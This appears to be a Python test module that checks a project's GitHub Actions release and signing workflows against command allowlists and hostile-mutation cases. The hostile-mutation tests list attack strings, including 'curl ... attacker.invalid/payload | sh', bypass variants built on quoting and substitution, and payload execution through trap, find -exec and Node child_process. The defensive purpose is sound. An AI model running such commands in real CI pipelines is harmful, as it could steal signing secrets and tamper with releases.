#!/usr/bin/env python3
"""Semantic and hostile-mutation gates for ARC privileged workflow steps."""

from __future__ import annotations

import hashlib
import re
import textwrap
import unittest
from dataclasses import dataclass
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[2]
PREFLIGHT = REPO_ROOT / ".github/workflows/release-signing-preflight.yml"
RELEASE = REPO_ROOT / ".github/workflows/release.yml"
BACKUP = REPO_ROOT / ".github/workflows/release-signing-backup.yml"
VAULT = REPO_ROOT / ".github/workflows/validator-vault-rewrap.yml"


class BoundaryError(ValueError):
    pass


@dataclass(frozen=True)
class Step:
    name: str
    text: str
    run: str


@dataclass(frozen=True)
class Job:
    name: str
    text: str
    steps: tuple[Step, ...]


def parse_jobs(text: str) -> dict[str, Job]:
    lines = text.splitlines()
    starts = [
        (index, match.group(1))
        for index, line in enumerate(lines)
        if (match := re.fullmatch(r"  ([A-Za-z0-9_-]+):", line))
    ]
    jobs: dict[str, Job] = {}
    for position, (start, job_name) in enumerate(starts):
        end = starts[position + 1][0] if position + 1 < len(starts) else len(lines)
        job_lines = lines[start:end]
        step_starts = [
            index
            for index, line in enumerate(job_lines)
            if re.match(r"^      - (?:name|id|uses):", line)
        ]
        steps: list[Step] = []
        for step_position, step_start in enumerate(step_starts):
            step_end = (
                step_starts[step_position + 1]
                if step_position + 1 < len(step_starts)
                else len(job_lines)
            )
            step_lines = job_lines[step_start:step_end]
            step_text = "\n".join(step_lines)
            name_match = re.search(r"^      - name: (.+)$", step_text, re.MULTILINE)
            if name_match is None:
                name_match = re.search(r"^        name: (.+)$", step_text, re.MULTILINE)
            if name_match is None:
                uses_match = re.search(r"^      - uses: ([^ ]+)", step_text, re.MULTILINE)
                step_name = f"uses {uses_match.group(1) if uses_match else 'unknown'}"
            else:
                step_name = name_match.group(1)
            run_match = re.search(r"^        run: \|\n(?P<body>.*)$", step_text, re.MULTILINE | re.DOTALL)
            if run_match is None:
                one_line = re.search(r"^        run: (.+)$", step_text, re.MULTILINE)
                run = one_line.group(1) if one_line else ""
            else:
                run = run_match.group("body")
            steps.append(Step(step_name, step_text, run))
        jobs[job_name] = Job(job_name, "\n".join(job_lines), tuple(steps))
    return jobs


SHELL_BUILTINS = {
    ":", "[", "[[", "break", "cd", "continue", "echo", "exit", "export",
    "false", "hash", "local", "printf", "read", "return", "set", "shift",
    "trap", "true", "ulimit", "umask", "unalias", "unset", "wait",
}

PRE_SECRET_COMMANDS = {
    "$node_bin", "/usr/bin/awk", "/usr/bin/cmp", "/usr/bin/find",
    "/usr/bin/gh", "/usr/bin/jq", "/usr/bin/python3", "/usr/bin/sha256sum",
    "/usr/bin/shasum", "/usr/bin/sort", "/usr/bin/tr", "/usr/bin/wc",
    "awk", "command", "cmp", "find", "gh", "git", "install", "jq", "mv", "npm",
    "sha256sum", "shasum", "sort", "tr", "wc",
}

# These are the three exact workflow-inline Python validators allowed to run in
# a protected job before or while signing/recovery material can become
# available.  Pinning the bodies closes the otherwise enormous ``python -``
# escape hatch: a changed validator must receive an explicit security review
# and corresponding contract update.
REVIEWED_PRIVILEGED_PYTHON_SHA256 = {
    "7f2abec0d11ea6f177af1b7aa84a2982743f57bad66eda07d42d9c64357dc282",
    "dc5630726239b434b993c503a2463bab77c590ba24da1b906a77ea2f45dbdb9a",
    "42463909bfd7ddd058150a548e37f4693841b67cabeeaf9e369196e8388dd9f3",
}

SECRET_COMMANDS = {
    "backup-readiness": {
        "$ARC_NODE_BIN", "/usr/bin/awk", "/usr/bin/chmod", "/usr/bin/cmp",
        "/usr/bin/gpg", "/usr/bin/install", "/usr/bin/printf",
        "/usr/bin/sha256sum", "/usr/bin/shred", "/usr/bin/sort",
        "/usr/bin/ssh-keygen", "/usr/bin/tar", "/usr/bin/tr", "/usr/bin/wc",
    },
    "manifest-key": {
        "/usr/bin/chmod", "/usr/bin/printf", "/usr/bin/shred",
        "/usr/bin/ssh-keygen",
    },
    "updater-key": {
        "$ARC_NODE_BIN", "/usr/bin/awk", "/usr/bin/printf",
        "/usr/bin/sha256sum", "/usr/bin/shasum",
    },
    "desktop-bundle": {
        "$ARC_NODE_BIN", "/usr/bin/awk", "/usr/bin/sha256sum",
        "/usr/bin/shasum",
    },
    "manifest-sign": {
        "/usr/bin/chmod", "/usr/bin/printf", "/usr/bin/shred",
        "/usr/bin/ssh-keygen",
    },
    "backup": {
        "/usr/bin/chmod", "/usr/bin/cmp", "/usr/bin/gpg", "/usr/bin/install",
        "/usr/bin/printf", "/usr/bin/sha256sum", "/usr/bin/shred",
        "/usr/bin/ssh-keygen", "/usr/bin/tar",
    },
    "rewrap": {
        "/usr/bin/base64", "/usr/bin/chmod", "/usr/bin/find", "/usr/bin/grep",
        "/usr/bin/jq", "/usr/bin/ln", "/usr/bin/mktemp", "/usr/bin/openssl",
        "/usr/bin/printf", "/usr/bin/python3", "/usr/bin/rmdir",
        "/usr/bin/sed", "/usr/bin/sha256sum", "/usr/bin/shred",
        "/usr/bin/unlink",
    },
}

PUBLISH_COMMANDS = {
    "/usr/bin/cmp", "/usr/bin/cp", "/usr/bin/gh", "/usr/bin/grep",
    "/usr/bin/jq", "/usr/bin/mkdir", "/usr/bin/sha256sum", "/usr/bin/sleep",
    "/usr/bin/tr", "/usr/bin/wc",
}


def _without_heredoc_bodies(text: str) -> str:
    """Keep shell command lines but remove only non-expanding heredoc data."""
    output: list[str] = []
    terminator: str | None = None
    for line in text.splitlines():
        if terminator is not None:
            if line.strip() == terminator:
                terminator = None
            continue
        output.append(line)
        candidate = re.search(r"(?<!<)<<-?(?!<)\s*([^\s;&|]+)", line)
        if candidate:
            token = candidate.group(1)
            match = re.fullmatch(r"(['\"])([A-Za-z_][A-Za-z0-9_]*)\1", token)
            if match is None:
                raise BoundaryError("privileged heredoc delimiter must be quoted")
            terminator = match.group(2)
    if terminator is not None:
        raise BoundaryError(f"unterminated privileged-step heredoc: {terminator}")
    return "\n".join(output)


def _balanced_substitution(text: str, opening: int) -> tuple[str, int]:
    """Return one $(...), <(...), or >(...) body and the character after it."""
    depth, index, quote = 1, opening + 1, None
    body_start = index
    while index < len(text):
        char = text[index]
        if quote == "'":
            if char == "'":
                quote = None
            index += 1
            continue
        if quote == '"':
            if char == "\\":
                index += 2
                continue
            if char == '"':
                quote = None
            index += 1
            continue
        if char in "'\"":
            quote = char
        elif char == "\\":
            index += 2
            continue
        elif char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
            if depth == 0:
                return text[body_start:index], index + 1
        index += 1
    raise BoundaryError("unterminated command substitution in privileged step")


def _shell_code_and_substitutions(text: str) -> tuple[str, list[str]]:
    """Remove data quotes/comments while retaining executable substitutions."""
    output: list[str] = []
    substitutions: list[str] = []
    index = 0
    while index < len(text):
        char = text[index]
        if char == "#":
            newline = text.find("\n", index)
            if newline < 0:
                break
            output.append("\n")
            index = newline + 1
            continue
        if char == "'":
            end = text.find("'", index + 1)
            if end < 0:
                raise BoundaryError("unterminated single quote in privileged step")
            value = text[index + 1:end]
            if re.fullmatch(
                r"(?:[A-Za-z_][A-Za-z0-9_.-]*|/[A-Za-z0-9_./${}-]+|"
                r"\$\{?[A-Za-z_][A-Za-z0-9_]*\}?(?:/[A-Za-z0-9_./${}-]+)?)",
                value,
            ):
                output.append(value)
            else:
                output.append(" " * (1 + text[index:end + 1].count("\n")))
            index = end + 1
            continue
        if char == '"':
            end = index + 1
            content: list[str] = []
            while end < len(text):
                if text[end] == "\\":
                    end += 2
                    continue
                if text.startswith("$(", end) and not text.startswith("$((", end):
                    body, after = _balanced_substitution(text, end + 1)
                    substitutions.append(body)
                    end = after
                    continue
                if text[end] == '"':
                    break
                content.append(text[end])
                end += 1
            if end >= len(text):
                raise BoundaryError("unterminated double quote in privileged step")
            value = "".join(content)
            # A quoted absolute/dynamic executable still occupies command-head
            # position and must not disappear merely because it was quoted.
            if re.fullmatch(
                r"(?:[A-Za-z_][A-Za-z0-9_.-]*|/[A-Za-z0-9_./${}-]+|"
                r"\$\{?[A-Za-z_][A-Za-z0-9_]*\}?(?:/[A-Za-z0-9_./${}-]+)?)",
                value,
            ):
                output.append(value)
            else:
                output.append(" " * (1 + text[index:end + 1].count("\n")))
            index = end + 1
            continue
        if text.startswith("$((", index):
            # Arithmetic expansion cannot select an executable. Keep it out of
            # the command-head grammar without mistaking it for $().
            end = text.find("))", index + 3)
            if end < 0:
                raise BoundaryError("unterminated arithmetic expansion in privileged step")
            arithmetic = text[index + 3:end]
            if "$(" in arithmetic or re.search(r"(?<!\\)`", arithmetic):
                raise BoundaryError("executable substitution inside privileged arithmetic expansion")
            index = end + 2
            continue
        if text.startswith("$(", index) or text.startswith("<(", index) or text.startswith(">(", index):
            body, after = _balanced_substitution(text, index + 1)
            substitutions.append(body)
            output.append(" ")
            index = after
            continue
        if char == "\\" and index + 1 < len(text):
            if text[index + 1] == "\n":
                output.append(" ")
            else:
                output.extend((char, text[index + 1]))
            index += 2
            continue
        output.append(char)
        index += 1
    return "".join(output), substitutions


def shell_command_heads(run: str) -> set[str]:
    """Extract every executable command head from the reviewed Bash subset."""
    functions = set(re.findall(r"(?m)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\)\s*\{", run))
    for declaration in re.finditer(
        r"(?m)^\s*[A-Za-z_][A-Za-z0-9_]*\s*\(\)\s*\{(?P<body>[^\n]*)$", run
    ):
        if declaration.group("body").strip():
            raise BoundaryError("inline privileged shell function body is forbidden")
    pending = [_without_heredoc_bodies(run)]
    heads: set[str] = set()
    while pending:
        code, substitutions = _shell_code_and_substitutions(pending.pop())
        pending.extend(substitutions)
        code = re.sub(r"\\\s*\n", " ", code)
        code = re.sub(
            r"(?m)^\s*(?:[^\s()|;]+\|)*[^\s()|;]+\)\s*",
            "",
            code,
        )
        for fragment in re.split(
            r"(?:&&|\|\||[;|\n]|(?<![<>&])&(?![>&]))", code
        ):
            fragment = fragment.strip()
            if not fragment:
                continue
            fragment = re.sub(r"^[(){}!]+\s*", "", fragment)
            fragment = re.sub(r"^(?:(?:then|do|else)\s+)+", "", fragment)
            fragment = re.sub(r"^(?:if|elif|while|until)\s+!?\s*", "", fragment)
            if not fragment or re.match(r"^(?:then|do|else|fi|done|esac)(?:\s|$)", fragment):
                continue
            if re.match(r"^(?:for|select)\s", fragment):
                continue
            case_match = re.match(r"^case\b.*?\bin(?:\s+(.*))?$", fragment)
            if case_match:
                fragment = (case_match.group(1) or "").strip()
                if not fragment:
                    continue
            if re.match(r"^(?:[^\s)]+(?:\|[^\s)]+)*)\)\s*$", fragment):
                continue
            while True:
                assignment = re.match(
                    r"^(?:(?:export|readonly|local)\s+)?[A-Za-z_][A-Za-z0-9_]*(?:\+)?=[^\s]*\s*",
                    fragment,
                )
                if assignment is None:
                    break
                fragment = fragment[assignment.end():].lstrip()
            if not fragment or fragment.startswith((">", "<")):
                continue
            match = re.match(
                r"(\[\[|\[|/[A-Za-z0-9_./${}-]+|"
                r"\$\{?[A-Za-z_][A-Za-z0-9_]*\}?(?:/[A-Za-z0-9_./${}-]+)?|"
                r"[A-Za-z_][A-Za-z0-9_.-]*)",
                fragment,
            )
            if match:
                head = match.group(1)
                if head not in functions:
                    heads.add(head)
            else:
                raise BoundaryError(f"unparsed nonempty privileged shell fragment: {fragment!r}")
    return heads


def privileged_dynamic_syntax(run: str) -> tuple[bool, bool]:
    """Report executable $'…'/$"…" and backticks outside literal quotes."""
    dynamic_quote = legacy_substitution = False
    quote: str | None = None
    index = 0
    while index < len(run):
        char = run[index]
        if quote == "'":
            if char == "'":
                quote = None
            index += 1
            continue
        if char == "\\":
            index += 2
            continue
        if quote == '"':
            if char == '"':
                quote = None
            elif char == "`":
                legacy_substitution = True
            index += 1
            continue
        if char in "'\"":
            quote = char
        elif char == "`":
            legacy_substitution = True
        elif char == "$" and index + 1 < len(run) and run[index + 1] in "'\"":
            dynamic_quote = True
        index += 1
    return dynamic_quote, legacy_substitution


def require_exact_command_heads(run: str, allowed: set[str], *, label: str) -> None:
    dynamic_quote, legacy_substitution = privileged_dynamic_syntax(run)
    if dynamic_quote:
        raise BoundaryError(f"{label} contains locale/ANSI-C dynamic quoting")
    if legacy_substitution:
        raise BoundaryError(f"{label} contains legacy command substitution")
    if re.search(r"(?m)(?:^|[;&|])[ \t]*[\"']?\$\((?!\()", run):
        raise BoundaryError(f"{label} executes the output of a command substitution")
    python_heads = len(re.findall(r"(?<![A-Za-z0-9_./-])/usr/bin/python3(?:\s|$)", run))
    python_bodies = [
        textwrap.dedent(match.group("body"))
        for match in re.finditer(
            r"/usr/bin/python3\s+-I\s+-(?:[^\n]*\\\n)*[^\n]*<<'PY'\n"
            r"(?P<body>.*?)^\s*PY\s*$",
            run,
            re.MULTILINE | re.DOTALL,
        )
    ]
    if python_heads != len(python_bodies):
        raise BoundaryError(f"{label} invokes Python outside an exact isolated heredoc")
    for body in python_bodies:
        digest = hashlib.sha256(body.encode()).hexdigest()
        if digest not in REVIEWED_PRIVILEGED_PYTHON_SHA256:
            raise BoundaryError(f"{label} contains an unreviewed inline Python body: {digest}")
    for wrapped in re.finditer(r"(?m)(?:^|[;&|]\s*)command\s+([^\n;&|]+)", run):
        if wrapped.group(1).strip() != "-v node":
            raise BoundaryError(f"{label} contains non-allowlisted command wrapper")
    declared_functions = set(
        re.findall(r"(?m)^\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\)\s*\{", run)
    )
    for line in run.splitlines():
        stripped = line.strip()
        if not stripped.startswith("trap "):
            continue
        match = re.fullmatch(
            r"trap\s+('exit 130'|[A-Za-z_][A-Za-z0-9_]*|-)\s+"
            r"((?:EXIT|HUP|INT|TERM)(?:\s+(?:EXIT|HUP|INT|TERM))*)",
            stripped,
        )
        if match is None:
            raise BoundaryError(f"{label} contains non-allowlisted trap syntax")
        handler = match.group(1).strip("'\"")
        if handler not in declared_functions | {"-", "exit 130"}:
            raise BoundaryError(f"{label} trap can execute an unreviewed handler: {handler}")
    logical = re.sub(r"\\\s*\n", " ", run)
    for executable in re.findall(r"\s-exec(?:dir)?\s+([^\s;]+)", logical):
        executable = executable.strip("'\"")
        if executable not in allowed:
            raise BoundaryError(f"{label} find -exec can invoke an unreviewed head: {executable}")
    for gh_match in re.finditer(r"(?m)(?:^|[($;|&])[ \t]*(?:/usr/bin/)?gh\s+([a-z-]+)(?:\s+([a-z-]+))?", run):
        pair = (gh_match.group(1), gh_match.group(2))
        if pair[0] != "api" and pair not in {("run", "list"), ("run", "download"), ("release", "upload")}:
            raise BoundaryError(f"{label} invokes an unreviewed gh command: {pair}")
    for npm_match in re.finditer(r"(?m)(?:^|[($;|&])[ \t]*npm\s+([a-z-]+)([^\n]*)", run):
        if npm_match.group(1) != "ci" or "--ignore-scripts" not in npm_match.group(2):
            raise BoundaryError(f"{label} invokes an unreviewed npm lifecycle surface")
    for git_match in re.finditer(r"(?m)(?:^|[($;|&])[ \t]*git\s+([^\s]+)", run):
        if git_match.group(1) not in {"fetch", "rev-parse"}:
            raise BoundaryError(f"{label} invokes an unreviewed Git surface")
    for node_match in re.finditer(
        r'(?m)(?:^|&&|\|\||[;|&]|\$\(|\bthen\s+|\bdo\s+)\s*'
        r'"?\$(ARC_NODE_BIN|node_bin)"?\s+([^\n;&|)]+)',
        run,
    ):
        variable, arguments = node_match.groups()
        if variable == "ARC_NODE_BIN":
            if not arguments.startswith('"$ARC_TAURI_CLI" signer sign '):
                raise BoundaryError(
                    f"{label} invokes the locked Node runtime outside direct Tauri signing"
                )
        elif arguments.strip() != "--version":
            raise BoundaryError(f"{label} invokes the candidate Node runtime outside --version")
    heads = shell_command_heads(run)
    unexpected = sorted(heads - SHELL_BUILTINS - allowed)
    if unexpected:
        raise BoundaryError(f"{label} contains non-allowlisted command heads: {unexpected}")


def require_privileged_shell_isolation(step: Step, *, label: str) -> None:
    for literal in ('BASH_ENV: ""', 'ENV: ""', "PATH: /usr/bin:/bin"):
        if literal not in step.text:
            raise BoundaryError(f"{label} lacks startup environment reset: {literal}")
    for literal in (
        "export PATH='/usr/bin:/bin'", "unset BASH_ENV ENV CDPATH", "unalias -a", "hash -r",
    ):
        if literal not in step.run:
            raise BoundaryError(f"{label} lacks in-shell isolation: {literal}")


def reject_repo_execution(text: str, *, label: str, allow_inline_python: bool = True) -> None:
    forbidden = {
        "repository script path": r"scripts/",
        "repository-relative executable": r"(?m:^\s*(?:\./|bash\s+[^\n]*\.sh\b|sh\s+[^\n]*\.sh\b))",
        "Cargo compiler/build surface": r"\bcargo\s+(?:build|run|test|rustc)\b|\brustc\b|\bbuild\.rs\b",
        "npm lifecycle/exec surface": r"\bnpm\s+(?:run|exec|test|start)\b|\bnpx\b",
        "shell source surface": r"(?m:^\s*(?:source\s+|\.\s+[^\n]+))",
    }
    if not allow_inline_python:
        forbidden["interpreter surface"] = r"\bpython(?:3)?\b"
    for description, pattern in forbidden.items():
        if re.search(pattern, text):
            raise BoundaryError(f"{label} contains {description}")


def validate_secret_workflows(texts: dict[str, str]) -> None:
    allowed_jobs = {
        ("preflight", "backup-readiness"),
        ("preflight", "manifest-key"),
        ("preflight", "updater-key"),
        ("preflight", "desktop-bundle"),
        ("release", "manifest-sign"),
        ("backup", "backup"),
        ("vault", "rewrap"),
    }
    secret_steps = 0
    for workflow_name, text in texts.items():
        for job_name, job in parse_jobs(text).items():
            matching = [index for index, step in enumerate(job.steps) if "${{ secrets." in step.text]
            if not matching:
                continue
            if (workflow_name, job_name) not in allowed_jobs:
                raise BoundaryError(f"unexpected secret-bearing job: {workflow_name}/{job_name}")
            if not re.search(r"(?m)^    environment: release$", job.text):
                raise BoundaryError(f"secret job lacks release environment: {workflow_name}/{job_name}")
            for index in matching:
                secret_steps += 1
                step = job.steps[index]
                before = "\n".join(item.text for item in job.steps[:index])
                reject_repo_execution(before, label=f"before {workflow_name}/{job_name}/{step.name}")
                for prior in job.steps[:index]:
                    if prior.run:
                        require_exact_command_heads(
                            prior.run,
                            PRE_SECRET_COMMANDS,
                            label=f"before {workflow_name}/{job_name}/{prior.name}",
                        )
                    uses = re.search(r"(?m)^      - uses: ([^\s]+)", prior.text)
                    if uses and not re.fullmatch(r"[^@]+@[0-9a-f]{40}", uses.group(1)):
                        raise BoundaryError(
                            f"unpinned action before {workflow_name}/{job_name}: {uses.group(1)}"
                        )
                if re.search(r"\bsigner\s+sign\b|\btauri\s+bundle\b", before):
                    raise BoundaryError(f"signer executed before secret step: {workflow_name}/{job_name}")
                require_privileged_shell_isolation(
                    step, label=f"secret step {workflow_name}/{job_name}/{step.name}"
                )
                require_exact_command_heads(
                    step.run,
                    SECRET_COMMANDS[job_name],
                    label=f"secret step {workflow_name}/{job_name}/{step.name}",
                )
                if job_name in {"desktop-bundle", "updater-key"}:
                    reject_repo_execution(step.run, label=f"updater key step {job_name}", allow_inline_python=False)
                    if "signer sign" not in step.run or "tauri bundle" in step.run:
                        raise BoundaryError(f"updater key step is not direct-sign only: {job_name}")
                    for literal in (
                        '"$ARC_NODE_BIN" "$ARC_TAURI_CLI" signer sign',
                        "ARC_NODE_SHA256:",
                        "ARC_TAURI_CLI_SHA256:",
                        "0dd6ec63c7c63a993fde20955e291d833c03f3760e63e0ee21e83482f6c0b43a",
                        "node-version: 24.20.0",
                    ):
                        if literal not in (step.text + "\n" + job.text):
                            raise BoundaryError(f"updater signer lacks exact runtime binding: {literal}")
                elif job_name in {"manifest-key", "manifest-sign"}:
                    reject_repo_execution(step.run, label=f"manifest key step {job_name}", allow_inline_python=False)
                    if "-Y sign" not in step.run:
                        raise BoundaryError(f"manifest key step lacks direct ssh-keygen sign: {job_name}")
                    if "-Y verify" in step.run:
                        raise BoundaryError(f"manifest key step does more than direct signing: {job_name}")
                elif workflow_name == "backup":
                    reject_repo_execution(step.run, label="backup creation secret step", allow_inline_python=False)
                    if any(word in step.run for word in (" node ", " npm ", " git ")):
                        raise BoundaryError("backup creation secret step invokes package/Git code")
                    for required in ("/usr/bin/gpg", "/usr/bin/ssh-keygen", "/usr/bin/shred -u"):
                        if required not in step.run:
                            raise BoundaryError(f"backup creation secret step omits {required}")
                elif job_name == "backup-readiness":
                    reject_repo_execution(step.run, label="backup readiness secret step", allow_inline_python=False)
                    for required in (
                        "/usr/bin/gpg", "signer sign", "cleanup_plaintext",
                        "ARC_NODE_SHA256:", "ARC_TAURI_CLI_SHA256:",
                        "node-version: 24.20.0",
                    ):
                        if required in {"ARC_NODE_SHA256:", "ARC_TAURI_CLI_SHA256:", "node-version: 24.20.0"}:
                            source = step.text + "\n" + job.text
                        else:
                            source = step.run
                        if required not in source:
                            raise BoundaryError(f"backup readiness secret step omits {required}")
                elif workflow_name == "vault":
                    reject_repo_execution(step.run, label="validator-vault secret step")
                    if "/usr/bin/python3 -I -" not in step.run:
                        raise BoundaryError("validator-vault parser is not isolated workflow-inline stdlib")
                    if re.search(r"(?m)^\s*(?:git|node|npm|cargo|rustc|bash|sh)\s", step.run):
                        raise BoundaryError("validator-vault secret step invokes a repo/package/Git surface")
                    for required in ("/usr/bin/openssl", "clear_secret_material"):
                        if required not in step.run:
                            raise BoundaryError(f"validator-vault secret step omits {required}")
    if secret_steps != 7:
        raise BoundaryError(f"expected seven reviewed secret-bearing steps, found {secret_steps}")


def validate_publish_authority(text: str) -> None:
    jobs = parse_jobs(text)
    write_jobs = {"publish-draft", "cleanup-rejected-draft", "publish"}
    token_steps = 0
    for name in write_jobs:
        job = jobs.get(name)
        if job is None:
            raise BoundaryError(f"missing isolated write job: {name}")
        if "actions/checkout@" in job.text or "scripts/" in job.text or "${{ secrets." in job.text:
            raise BoundaryError(f"write-authority job has checkout/repository/secret surface: {name}")
        if not re.search(r"(?m)^      contents: write$", job.text):
            raise BoundaryError(f"write-authority job lacks explicit contents:write: {name}")
        for step in job.steps:
            if "GH_TOKEN: ${{ github.token }}" not in step.text:
                continue
            token_steps += 1
            run = step.run
            require_privileged_shell_isolation(step, label=f"token step {name}/{step.name}")
            require_exact_command_heads(
                run, PUBLISH_COMMANDS, label=f"token step {name}/{step.name}"
            )
            forbidden = {
                "repository path": r"scripts/|(?m:^\s*(?:\./|bash\s+|sh\s+))",
                "interpreter/package/compiler": r"(?m:^\s*(?:python(?:3)?|node|npm|npx|cargo|rustc)\s)",
                "Git/hook/config surface": r"(?m:^\s*git\s)",
                "shell source": r"(?m:^\s*(?:source\s+|\.\s+))",
                "repository-sourced substitution": r"\$\([^)]*(?:scripts/|\./|bash\s|sh\s|python|node|npm|cargo|rustc)",
            }
            for description, pattern in forbidden.items():
                if re.search(pattern, run):
                    raise BoundaryError(f"token step {name}/{step.name} contains {description}")
            if "/usr/bin/gh " not in run:
                raise BoundaryError(f"token step does not contain a fixed gh operation: {name}/{step.name}")
            if "--method DELETE" in run \
                    and ".draft == true and .immutable == false" not in run:
                raise BoundaryError(
                    f"token step can delete without proving an exact mutable draft: {name}/{step.name}"
                )
    if token_steps != 4:
        raise BoundaryError(f"expected four isolated GitHub mutation/cleanup steps, found {token_steps}")

    publish = jobs["publish"]
    if "for poll_attempt in {1..12}" not in publish.text or "/usr/bin/sleep 5" not in publish.text:
        raise BoundaryError("immutable publication lacks bounded eventual-consistency polling")
    for literal in (
        "publication_attempted=true",
        "published_immutable=true",
        'if [ "$publication_attempted" != true ]; then',
        "state is unconfirmed and cleanup is forbidden",
        "Preserve release state if publication or evidence sealing failed",
    ):
        if literal not in publish.text:
            raise BoundaryError(f"immutable publication cleanup boundary omits: {literal}")
    preserve_step = next(
        (step for step in publish.steps if step.name == "Preserve release state if publication or evidence sealing failed"),
        None,
    )
    if preserve_step is None or "GH_TOKEN:" in preserve_step.text or "--method DELETE" in preserve_step.run:
        raise BoundaryError("post-publication failure path can still delete a release")

    for name, draft_flag in (("verify-draft-release", "--draft true --immutable false"),
                             ("verify-published-release", "--draft false --immutable true")):
        job = jobs.get(name)
        if job is None or not re.search(r"(?m)^      contents: read$", job.text):
            raise BoundaryError(f"missing read-only server verifier: {name}")
        if "GH_TOKEN:" in job.text or "contents: write" in job.text:
            raise BoundaryError(f"server verifier has publication authority: {name}")
        if "python3 scripts/release/verify-github-release.py" not in job.text or draft_flag not in job.text:
            raise BoundaryError(f"server verifier omits exact contract: {name}")
    if "needs: [validate, publish-draft, verify-draft-release]" not in jobs["publish"].text:
        raise BoundaryError("final publication does not depend on independent draft verification")


class PrivilegedWorkflowBoundaryTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.texts = {
            "preflight": PREFLIGHT.read_text(encoding="utf-8"),
            "release": RELEASE.read_text(encoding="utf-8"),
            "backup": BACKUP.read_text(encoding="utf-8"),
            "vault": VAULT.read_text(encoding="utf-8"),
        }

    def test_current_secret_and_publication_boundaries(self) -> None:
        validate_secret_workflows(self.texts)
        validate_publish_authority(self.texts["release"])

    def assert_secret_mutation_rejected(self, workflow: str, old: str, new: str) -> None:
        mutated = dict(self.texts)
        self.assertIn(old, mutated[workflow])
        mutated[workflow] = mutated[workflow].replace(old, new, 1)
        with self.assertRaises(BoundaryError):
            validate_secret_workflows(mutated)

    def test_rejects_materialize_time_repository_substitution(self) -> None:
        marker = "      - name: Sign only the verified updater payload"
        self.assert_secret_mutation_rejected(
            "preflight", marker,
            "      - name: Compromised materializer\n        run: python3 scripts/release/unsigned-desktop-handoff.py materialize\n\n" + marker,
        )

    def test_rejects_compiler_or_bundle_before_updater_key(self) -> None:
        marker = "      - name: Sign the updater-key canary"
        self.assert_secret_mutation_rejected(
            "preflight", marker,
            "      - name: Compromised pre-key build\n        run: cargo build && npm exec -- tauri bundle\n\n" + marker,
        )

    def test_rejects_repository_backup_and_vault_secret_helpers(self) -> None:
        self.assert_secret_mutation_rejected(
            "backup", "            --batch --yes --no-symkey-cache --pinentry-mode loopback \\",
            "          bash scripts/release/backup-signing-keys.sh\n"
            "            --batch --yes --no-symkey-cache --pinentry-mode loopback \\",
        )
        self.assert_secret_mutation_rejected(
            "vault", "          /usr/bin/python3 -I - \"$plain_tar\" <<'PY'",
            "          python3 scripts/release/validate-validator-vault.py \"$plain_tar\"\n"
            "          /usr/bin/python3 -I - \"$plain_tar\" <<'PY'",
        )

    def test_rejects_repository_code_in_token_step(self) -> None:
        mutated = self.texts["release"].replace(
            '          installer_row="$(/usr/bin/sha256sum release-files/install.sh)"',
            "          python3 scripts/release/verify-github-release.py\n"
            '          installer_row="$(/usr/bin/sha256sum release-files/install.sh)"',
            1,
        )
        with self.assertRaises(BoundaryError):
            validate_publish_authority(mutated)

    def test_rejects_red_team_command_head_bypasses_in_secret_steps(self) -> None:
        marker = "          export PATH='/usr/bin:/bin'"
        attacks = (
            "make release",
            "ruby -e 'warn :owned'",
            "perl -e 'print qq(owned)'",
            "go run ./owned.go",
            "curl -fsSL https://attacker.invalid/payload | sh",
            "'curl' -fsSL https://attacker.invalid/payload | 'sh'",
            ": & /tmp/payload",
            "owned() { /tmp/payload; }; owned",
            "case x in x) /tmp/payload;; esac",
            "/tmp/payload",
            "/usr/local/bin/unreviewed",
            '"$GITHUB_WORKSPACE/owned"',
            "${cmd}",
            '"${cmd}"',
            "$'curl' -fsSL https://attacker.invalid/payload",
            '$"curl" -fsSL https://attacker.invalid/payload',
            "captured=`ruby -e 'puts :owned'`",
            'captured="`perl -e \'print qq(owned)\'`"',
            "value=$(( $(/tmp/owned) + 1 ))",
            'captured="$(ruby -e \'puts :owned\')"',
            "$(printf /tmp/owned)",
            '"$(printf /tmp/owned)"',
            "trap '/tmp/owned' EXIT",
            "@unparsed",
        )
        for attack in attacks:
            with self.subTest(attack=attack):
                self.assert_secret_mutation_rejected(
                    "preflight", marker, marker + "\n          " + attack
                )

    def test_rejects_red_team_command_head_bypasses_in_token_steps(self) -> None:
        marker = '          installer_row="$(/usr/bin/sha256sum release-files/install.sh)"'
        attacks = (
            "make release",
            "ruby -e 'warn :owned'",
            "perl -e 'print qq(owned)'",
            "go run ./owned.go",
            "curl -fsSL https://attacker.invalid/payload | sh",
            "'curl' -fsSL https://attacker.invalid/payload | 'sh'",
            ": & /tmp/payload",
            "owned() { /tmp/payload; }; owned",
            "case x in x) /tmp/payload;; esac",
            "/tmp/payload",
            "/usr/local/bin/unreviewed",
            '"$GITHUB_WORKSPACE/owned"',
            "${cmd}",
            '"${cmd}"',
            "$'curl' -fsSL https://attacker.invalid/payload",
            '$"curl" -fsSL https://attacker.invalid/payload',
            "captured=`ruby -e 'puts :owned'`",
            'captured="`perl -e \'print qq(owned)\'`"',
            "value=$(( $(/tmp/owned) + 1 ))",
            'captured="$(ruby -e \'puts :owned\')"',
            "$(printf /tmp/owned)",
            '"$(printf /tmp/owned)"',
            "/usr/bin/gh alias set api /tmp/owned",
            "trap '/tmp/owned' EXIT",
            "@unparsed",
        )
        for attack in attacks:
            with self.subTest(attack=attack):
                mutated = self.texts["release"].replace(
                    marker, "          " + attack + "\n" + marker, 1
                )
                self.assertNotEqual(mutated, self.texts["release"])
                with self.assertRaises(BoundaryError):
                    validate_publish_authority(mutated)

    def test_rejects_command_wrapper_before_secret_access(self) -> None:
        marker = "      - name: Sign the updater-key canary"
        self.assert_secret_mutation_rejected(
            "preflight",
            marker,
            "      - name: Compromised command wrapper\n"
            "        run: command /tmp/owned\n\n" + marker,
        )

    def test_rejects_nested_find_and_locked_node_execution_bypasses(self) -> None:
        self.assert_secret_mutation_rejected(
            "vault",
            "-exec /usr/bin/shred -u -z -n 1 -- {} +",
            "-exec /tmp/owned {} +",
        )
        direct = '          "$ARC_NODE_BIN" "$ARC_TAURI_CLI" signer sign "$tauri_canary"'
        self.assert_secret_mutation_rejected(
            "preflight",
            direct,
            '          "$ARC_NODE_BIN" -e \'require("child_process").execSync("/tmp/owned")\'\n' + direct,
        )
        self.assert_secret_mutation_rejected(
